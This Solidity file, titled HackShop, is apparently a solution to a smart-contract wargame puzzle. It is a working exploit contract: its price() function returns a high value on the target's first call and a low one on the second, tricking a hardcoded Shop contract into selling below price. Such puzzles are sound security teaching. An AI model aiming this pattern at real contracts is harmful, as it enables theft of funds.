// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.15;

/**
    @title HackShop
    @notice Since Buyer is called 2 times, we can manipulate the value returned to satify the check and deceive it.
*/

interface Shop {
    function buy() external;
    function isSold() external view returns(bool);
}

contract HackShop {
    Shop toHack = Shop(0xdC2c82e7D093359BA87e49a2b55Bf419E5dfDf9d);
    uint biggerPrice = 101;
    uint smallerPrice = 1;

    function buy() external {
        toHack.buy();
    }

    function price() external view returns(uint) {
        if(toHack.isSold() == false) { 
            return biggerPrice;
        }
        return smallerPrice;
    }

}